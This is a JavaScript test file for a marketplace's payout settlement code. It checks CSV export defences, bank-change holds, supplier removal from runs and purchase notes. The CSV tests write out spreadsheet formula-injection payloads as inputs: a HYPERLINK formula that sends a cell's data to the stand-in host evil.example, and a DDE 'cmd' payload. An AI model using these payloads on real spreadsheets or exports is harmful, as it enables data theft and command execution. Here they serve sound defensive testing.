'use strict';
/**
 * Maker payout safety (review round 2026-10-02, group B) — src/settlement.js,
 * src/csv.js, POST /api/seller/payout-setup and the admin settlement routes.
 *
 *   F046  the bank file pays the account copied into the run at draft time,
 *         not whatever is on the shop when the file is downloaded; changing
 *         an account already on file needs the password again, emails the
 *         maker (masked IBAN only) and holds the next run until the owner
 *         releases it; Admin sees when live details differ from the run's
 *   F047  every CSV cell that starts like a spreadsheet formula is defused,
 *         and payout names may not start like one
 *   F049  a suspended (or held) shop is left out of the run with a reason, and
 *         one supplier can be taken out of a draft/exported run — their
 *         ledger rows are un-stamped, nothing is recorded as paid
 *   F050  a purchase note lists only the units Trove bought: units refunded
 *         before the run are shown apart, and the margin is the real one
 */
const { testEnv, startApp } = require('./helpers');
testEnv({ PAYOUT_ENC_KEY: 'a3f1c9e2b47d80561e93fa2c74b8d015c2e6a90f3b7d4188e5c0a9d2f16b3874' });

const fs = require('fs');
const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');

let ctx, db, api, adminCookie, buyerId;
const sent = [];
const IBAN_OLD = 'AE070331234567890123456';
const IBAN_NEW = 'AE940260001015555555555';
let n = 0;

/** A shop with verified payout details (licensed: no ID photos needed). */
function mkShop(slug, name = slug) {
  const { hashPassword } = require('../src/middleware');
  const pcrypto = require('../src/crypto');
  const uid = db.prepare("INSERT INTO users (email,password_hash,name,role) VALUES (?,?,?, 'seller')")
    .run(`${slug}@test.local`, hashPassword('testpass123'), `${slug} owner`).lastInsertRowid;
  const id = db.prepare(`INSERT INTO shops (user_id,name,slug,status,payout_bank_name,payout_account_name,iban_encrypted,iban_masked,
      agreement_version,agreement_accepted_at,license_verified_at,emirates_id_last4)
    VALUES (?,?,?, 'approved','Emirates NBD',?,?,?, 'v4', datetime('now'), datetime('now'), '1234')`)
    .run(uid, name, slug, `${slug} owner`, pcrypto.encrypt(IBAN_OLD), pcrypto.maskIban(IBAN_OLD)).lastInsertRowid;
  return { id: Number(id), email: `${slug}@test.local` };
}

/** A delivered sale whose return window closed: payable at the next run. */
function sale(shopId, items, creditCents) {
  const pub = `TRV-PS${String(++n).padStart(3, '0')}`;
  const sub = items.reduce((s, i) => s + i.price * (i.qty || 1), 0);
  const oid = db.prepare(`INSERT INTO orders (public_id,email,subtotal_cents,total_cents,status,rail,title_transferred_at,buyer_id)
    VALUES (?, 'b@test.local', ?, ?, 'paid', 'consignment', datetime('now','-20 days'), ?)`).run(pub, sub, sub, buyerId).lastInsertRowid;
  const ids = items.map((i) => db.prepare('INSERT INTO order_items (order_id,shop_id,name_snapshot,price_cents,qty) VALUES (?,?,?,?,?)')
    .run(oid, shopId, i.name, i.price, i.qty || 1).lastInsertRowid);
  db.prepare("INSERT INTO seller_balances (shop_id,order_id,type,amount_cents) VALUES (?,?, 'credit_sale', ?)").run(shopId, oid, creditCents);
  db.prepare(`INSERT INTO shipments (order_id,shop_id,status,delivered_at,return_window_ends_at)
    VALUES (?,?, 'delivered', datetime('now','-18 days'), datetime('now','-2 days'))`).run(oid, shopId);
  return { orderId: Number(oid), publicId: pub, itemIds: ids.map(Number) };
}

const preview = async () => (await api('GET', '/api/admin/settlements/preview', { cookie: adminCookie })).data;
const runNow = async () => (await api('POST', '/api/admin/settlements/run', { cookie: adminCookie, body: {} })).data;
const csvOf = async (id) => (await api('GET', `/api/admin/settlements/${id}/export.csv`, { cookie: adminCookie })).text;
const setup = (cookie, body) => api('POST', '/api/seller/payout-setup', { cookie, body: {
  emiratesIdLast4: '1234', emiratesIdExpiry: '2031-01-01', accountName: 'Mara Studio', bankName: 'Emirates NBD',
  iban: IBAN_OLD, acceptAgreement: true, ...body } });

before(async () => {
  ctx = await startApp(); db = ctx.db; api = ctx.api;
  require('../src/email').send = async (msg) => { sent.push(msg); return { id: 'test' }; };
  const { hashPassword } = require('../src/middleware');
  db.prepare("INSERT INTO users (email,password_hash,name,role) VALUES ('admin@test.local',?, 'Admin','admin')").run(hashPassword('adminpass123'));
  buyerId = db.prepare("INSERT INTO users (email,password_hash,name,role) VALUES ('buyer@test.local',?, 'Buyer','buyer')").run(hashPassword('testpass123')).lastInsertRowid;
  adminCookie = await ctx.loginAs('admin@test.local', 'adminpass123');
});
after(async () => { await ctx.close(); });

/* ---------------- F047: CSV formula injection ---------------- */

test('csvCell defuses anything a spreadsheet would evaluate, and quotes every cell', () => {
  const { csvCell } = require('../src/csv');
  assert.equal(csvCell('=HYPERLINK("https://evil.example/?"&D3,"Open")'), `"'=HYPERLINK(""https://evil.example/?""&D3,""Open"")"`);
  for (const v of ['+1+1', '-2+3', '@SUM(1+1)', '\t=1', '\r=1', "=cmd|' /C calc'!A0"]) {
    assert.ok(csvCell(v).startsWith(`"'`), `defused: ${JSON.stringify(v)}`);
  }
  assert.equal(csvCell('Mara Ceramics Studio'), '"Mara Ceramics Studio"');
  assert.equal(csvCell(''), '""');
  assert.equal(csvCell(null), '""');
});

test('a shop named like a formula cannot turn the settlement file into a live link', async () => {
  const evil = mkShop('evil-shop', '=HYPERLINK("https://evil.example/?"&D3,"Open")');
  sale(evil.id, [{ name: 'Bowl', price: 10000 }], 6000);
  const r = await runNow();
  assert.equal(r.created, true);
  const csv = await csvOf(r.settlementId);
  const line = csv.split('\r\n').find((l) => l.includes('HYPERLINK'));
  assert.ok(line.startsWith(`"'=HYPERLINK(`), line);
  for (const cell of line.split(',')) assert.ok(!/^"?[=+\-@]/.test(cell), `no live formula cell: ${cell}`);
  // close this run so later tests start clean
  assert.equal((await api('POST', `/api/admin/settlements/${r.settlementId}/paid`, { cookie: adminCookie })).status, 200);
});

test('payout names that start like a formula, or carry markup, are refused at payout setup', async () => {
  const s = mkShop('names-shop');
  const cookie = await ctx.loginAs(s.email, 'testpass123');
  for (const bad of [{ accountName: "=cmd|' /C calc'!A0" }, { bankName: '@SUM(1+1)' }, { accountName: '+971 Holder' }, { bankName: '<b>Bank</b>' }]) {
    const r = await setup(cookie, { ...bad, currentPassword: 'testpass123' });
    assert.equal(r.status, 400, `${JSON.stringify(bad)} → ${r.text}`);
  }
  assert.equal(db.prepare('SELECT payout_bank_name FROM shops WHERE id=?').get(s.id).payout_bank_name, 'Emirates NBD', 'nothing saved');
});

/* ---------------- F046: the run pays the account it was drafted against ---------------- */

let mara, maraCookie, maraRun;
test('changing bank details on file needs the password again', async () => {
  mara = mkShop('mara', 'Mara Ceramics Studio');
  maraCookie = await ctx.loginAs(mara.email, 'testpass123');
  const none = await setup(maraCookie, { iban: IBAN_NEW, accountName: 'Someone Else', bankName: 'Mashreq Bank' });
  assert.equal(none.status, 400);
  assert.equal(none.data.code, 'wrong_password');
  const wrong = await setup(maraCookie, { iban: IBAN_NEW, accountName: 'Someone Else', bankName: 'Mashreq Bank', currentPassword: 'nope-nope-1' });
  assert.equal(wrong.status, 400);
  const shop = db.prepare('SELECT * FROM shops WHERE id=?').get(mara.id);
  assert.equal(shop.payout_account_name, 'mara owner', 'unchanged');
  assert.equal(require('../src/crypto').decrypt(shop.iban_encrypted), IBAN_OLD);
});

test('a bank change after the run was drafted: the file still pays the reviewed account, and Admin is warned', async () => {
  sale(mara.id, [{ name: 'Vase', price: 6400 }], 3840);
  const r = await runNow();
  assert.equal(r.created, true);
  maraRun = r.settlementId;
  const item = db.prepare('SELECT * FROM settlement_items WHERE settlement_id=? AND shop_id=?').get(maraRun, mara.id);
  assert.ok(item.iban_encrypted, 'the account is copied onto the run');
  assert.notEqual(item.iban_encrypted, IBAN_OLD, 'as ciphertext');
  assert.equal(item.payout_account_name, 'mara owner');

  sent.length = 0;
  const ch = await setup(maraCookie, { iban: IBAN_NEW, accountName: 'Someone Else', bankName: 'Mashreq Bank', currentPassword: 'testpass123' });
  assert.equal(ch.status, 200, ch.text);

  const csv = await csvOf(maraRun);
  assert.ok(csv.includes(IBAN_OLD), 'pays the account reviewed in the run');
  assert.ok(!csv.includes(IBAN_NEW), 'never the account typed in after it');
  assert.ok(csv.includes('"mara owner","Emirates NBD"'));
  assert.ok(!csv.includes('Someone Else'));

  const hist = await api('GET', '/api/admin/settlements', { cookie: adminCookie });
  const it = hist.data.settlements.find((s) => s.id === maraRun).items.find((i) => i.shopId === mara.id);
  assert.equal(it.bankChangedSinceRun, true, 'Admin sees the live details moved on');
  assert.ok(!hist.text.includes(IBAN_NEW) && !hist.text.includes(IBAN_OLD), 'no full IBAN in the listing');

  // the maker is told, with the masked IBAN only
  await new Promise((res) => setTimeout(res, 20));
  const mail = sent.find((m) => m.to === mara.email);
  assert.ok(mail, 'change email sent');
  assert.match(mail.subject, /bank details were changed/);
  assert.ok(mail.html.includes('5555'), 'last four digits');
  assert.ok(!mail.html.includes(IBAN_NEW) && !mail.html.includes('0260001015555555555'), 'never the full IBAN');
  assert.ok(/reply to this email/.test(mail.html));
  assert.equal((await api('POST', `/api/admin/settlements/${maraRun}/paid`, { cookie: adminCookie })).status, 200);
});

test('the first run after a bank change waits for the owner, who releases it', async () => {
  const shop = db.prepare('SELECT payout_hold, payout_hold_reason, bank_changed_at FROM shops WHERE id=?').get(mara.id);
  assert.equal(shop.payout_hold, 1);
  assert.equal(shop.payout_hold_reason, 'bank_details_changed');
  assert.ok(shop.bank_changed_at);
  sale(mara.id, [{ name: 'Jug', price: 10000 }], 6000);
  let pv = await preview();
  assert.equal(pv.excluded.find((x) => x.shopId === mara.id).reason, 'bank_details_changed');
  assert.ok(!pv.eligible.some((x) => x.shopId === mara.id));
  assert.equal((await runNow()).created, false, 'nothing else is payable, so no run');

  const rel = await api('POST', `/api/admin/shops/${mara.id}/payout-hold`, { cookie: adminCookie, body: { hold: false } });
  assert.equal(rel.status, 200);
  assert.equal(rel.data.shop.payoutHold, false);
  pv = await preview();
  assert.equal(pv.eligible.find((x) => x.shopId === mara.id).netCents, 6000, 'held money goes in the next run — nothing lost');
});

test('re-saving the SAME account (e.g. renewing an Emirates ID) is not a bank change', async () => {
  sent.length = 0;
  const r = await setup(maraCookie, { iban: IBAN_NEW, accountName: 'Someone Else', bankName: 'Mashreq Bank', emiratesIdExpiry: '2032-05-05', currentPassword: 'testpass123' });
  assert.equal(r.status, 200, r.text);
  assert.equal(db.prepare('SELECT payout_hold FROM shops WHERE id=?').get(mara.id).payout_hold, 0, 'no hold');
  await new Promise((res) => setTimeout(res, 20));
  assert.equal(sent.filter((m) => m.to === mara.email).length, 0, 'nothing changed, nothing to report');
});

/* ---------------- F049: holds and taking one supplier out of a run ---------------- */

test('a suspended shop, or one the owner put on hold, is left out of the run', async () => {
  const sus = mkShop('suspended-shop');
  sale(sus.id, [{ name: 'Plate', price: 5000 }], 3000);
  db.prepare("UPDATE shops SET status='suspended' WHERE id=?").run(sus.id);
  const held = mkShop('held-shop');
  sale(held.id, [{ name: 'Cup', price: 5000 }], 3000);
  const h = await api('POST', `/api/admin/shops/${held.id}/payout-hold`, { cookie: adminCookie, body: { hold: true } });
  assert.equal(h.data.shop.payoutHoldReason, 'manual');

  const pv = await preview();
  assert.equal(pv.excluded.find((x) => x.shopId === sus.id).reason, 'on_hold');
  assert.equal(pv.excluded.find((x) => x.shopId === held.id).reason, 'on_hold');
  const r = await runNow();
  assert.ok(!(r.items || []).some((i) => [sus.id, held.id].includes(i.shopId)), 'neither is swept');
  const unswept = db.prepare('SELECT COUNT(*) AS c FROM seller_balances WHERE shop_id IN (?,?) AND settlement_id IS NULL').get(sus.id, held.id).c;
  assert.equal(unswept, 2, 'their money waits, unswept');
  if (r.created) {
    await csvOf(r.settlementId); // Mark paid comes after the bank file (F185)
    assert.equal((await api('POST', `/api/admin/settlements/${r.settlementId}/paid`, { cookie: adminCookie })).status, 200);
  }
});

test('one supplier can be taken out of an exported run: rows un-stamped, nothing recorded as paid', async () => {
  const a = mkShop('keep-shop');
  const b = mkShop('pull-shop');
  sale(a.id, [{ name: 'Bowl', price: 10000 }], 6000);
  const bSale = sale(b.id, [{ name: 'Lamp', price: 20000 }], 12000);
  const r = await runNow();
  assert.equal(r.items.length, 2);
  await csvOf(r.settlementId); // exported
  const bItem = r.items.find((i) => i.shopId === b.id);

  const rm = await api('POST', `/api/admin/settlements/${r.settlementId}/items/${bItem.settlementItemId}/remove`, { cookie: adminCookie, body: { hold: true } });
  assert.equal(rm.status, 200, rm.text);
  assert.equal(rm.data.wasExported, true, 'the caller is told the file already went out');
  const st = db.prepare('SELECT * FROM settlements WHERE id=?').get(r.settlementId);
  assert.equal(st.total_cents, 6000, 'the run total drops');
  assert.equal(db.prepare('SELECT settlement_id FROM seller_balances WHERE order_id=?').get(bSale.orderId).settlement_id, null, 'un-stamped');
  assert.equal(db.prepare('SELECT payout_hold FROM shops WHERE id=?').get(b.id).payout_hold, 1, 'and held');
  assert.ok(!(await csvOf(r.settlementId)).includes('pull-shop'), 'gone from the bank file');

  assert.equal((await api('POST', `/api/admin/settlements/${r.settlementId}/paid`, { cookie: adminCookie })).status, 200);
  assert.equal(db.prepare("SELECT COUNT(*) AS c FROM seller_balances WHERE shop_id=? AND type='payout'").get(b.id).c, 0, 'never recorded as paid');
  assert.equal(db.prepare('SELECT COUNT(*) AS c FROM purchase_notes WHERE shop_id=?').get(b.id).c, 0, 'and no purchase note');
  assert.equal((await api('GET', `/api/seller/settlements`, { cookie: await ctx.loginAs(b.email, 'testpass123') })).data.settledCents, 0);

  // a paid run is final
  const other = db.prepare('SELECT id FROM settlement_items WHERE settlement_id=?').get(r.settlementId);
  const late = await api('POST', `/api/admin/settlements/${r.settlementId}/items/${other.id}/remove`, { cookie: adminCookie, body: {} });
  assert.equal(late.status, 409);

  // released, the held money goes in the next run
  await api('POST', `/api/admin/shops/${b.id}/payout-hold`, { cookie: adminCookie, body: { hold: false } });
  const next = await runNow();
  assert.equal(next.items.find((i) => i.shopId === b.id).amountCents, 12000);
  await csvOf(next.settlementId);
  await api('POST', `/api/admin/settlements/${next.settlementId}/paid`, { cookie: adminCookie });
});

test('the hold and removal routes are admin-only', async () => {
  const s = mkShop('nosy-shop');
  const cookie = await ctx.loginAs(s.email, 'testpass123');
  assert.equal((await api('POST', `/api/admin/shops/${s.id}/payout-hold`, { cookie, body: { hold: false } })).status, 403);
  assert.equal((await api('POST', '/api/admin/settlements/1/items/1/remove', { cookie, body: {} })).status, 403);
});

/* ---------------- F050: purchase notes after a partial return ---------------- */

test('a purchase note lists only the pieces Trove bought, with the real margin', async () => {
  const s = mkShop('leather-shop', 'Leather Works');
  // AED 195 kept + AED 100 returned and refunded before the run: the credit
  // shrank to 60% of 195 = AED 117 (returns.reverseCredits).
  const o = sale(s.id, [{ name: 'Folded Leather Wallet', price: 19500 }, { name: 'Returned Card Holder', price: 10000 }], 11700);
  const rr = db.prepare(`INSERT INTO return_requests (order_id,buyer_id,reason,status,refund_cents)
    VALUES (?,?, 'changed-mind', 'refunded', 10000)`).run(o.orderId, buyerId).lastInsertRowid;
  db.prepare('INSERT INTO return_request_items (request_id,order_item_id,qty) VALUES (?,?,1)').run(rr, o.itemIds[1]);

  const r = await runNow();
  assert.equal(r.items.find((i) => i.shopId === s.id).amountCents, 11700);
  await csvOf(r.settlementId);
  assert.equal((await api('POST', `/api/admin/settlements/${r.settlementId}/paid`, { cookie: adminCookie })).status, 200);
  const note = db.prepare('SELECT * FROM purchase_notes WHERE shop_id=?').get(s.id);
  const html = fs.readFileSync(note.html_path, 'utf8');
  const row = html.slice(html.indexOf(o.publicId), html.indexOf('</tr>', html.indexOf(o.publicId)));
  assert.match(row, /1 × Folded Leather Wallet/);
  assert.match(row, /Returned — not purchased: 1 × Returned Card Holder/);
  assert.ok(row.includes('AED 195.00'), 'list price of what was bought');
  assert.ok(row.includes('AED 78.00'), 'the real 40% margin');
  assert.ok(row.includes('AED 117.00'), 'purchase price');
  assert.ok(!row.includes('AED 295.00') && !row.includes('AED 178.00'), 'never the returned piece in the totals');

  const lines = require('../src/settlement').noteLines(o.publicId, s.id);
  assert.deepEqual(lines.kept.map((l) => [l.name, l.qty]), [['Folded Leather Wallet', 1]]);
  assert.deepEqual(lines.returned.map((l) => [l.name, l.qty]), [['Returned Card Holder', 1]]);
  assert.equal(lines.grossCents, 19500);
});
